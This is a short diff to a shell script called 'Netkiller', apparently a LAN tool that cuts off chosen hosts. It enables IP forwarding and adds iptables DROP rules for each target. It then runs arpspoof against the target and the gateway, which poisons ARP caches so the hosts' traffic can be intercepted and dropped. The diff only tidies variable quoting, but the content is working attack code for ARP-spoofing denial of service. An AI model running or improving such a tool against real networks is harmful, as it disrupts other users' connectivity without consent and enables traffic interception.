@@ -125,6 +125,7 @@ case $target_type in
         fi
 
         # Iptables policy
+        echo 1 > /proc/sys/net/ipv4/ip_forward
         iptables -P FORWARD DROP
         iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
 
@@ -216,8 +217,8 @@ for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller kill the connection of $TARGET"
 
     # Iptables rules
-    iptables -I FORWARD -s $TARGET -j DROP
-    iptables -I FORWARD -d $TARGET -j DROP 
+    iptables -I FORWARD -s "$TARGET" -j DROP
+    iptables -I FORWARD -d "$TARGET" -j DROP 
     
     # Bidirectional blocking
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
